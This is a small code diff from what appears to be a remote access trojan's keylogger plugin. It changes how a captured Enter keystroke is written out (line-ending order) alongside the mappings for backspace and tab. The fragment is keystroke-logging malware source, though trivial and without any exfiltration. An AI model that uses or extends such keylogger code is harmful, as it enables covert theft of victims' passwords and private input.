@@ -63,7 +63,7 @@ public class ClientPlugin extends RATPlugin {
 					if (ckey == '\b') {
 						key = "[BACKSPACE]";
 					} else if (ckey == '\n' || ckey == '\r') {
-						key = "[ENTER]\n\r";
+						key = "[ENTER]\r\n";
 					} else if (ckey == '\t') {
 						key = "[TAB]\t";
 					}
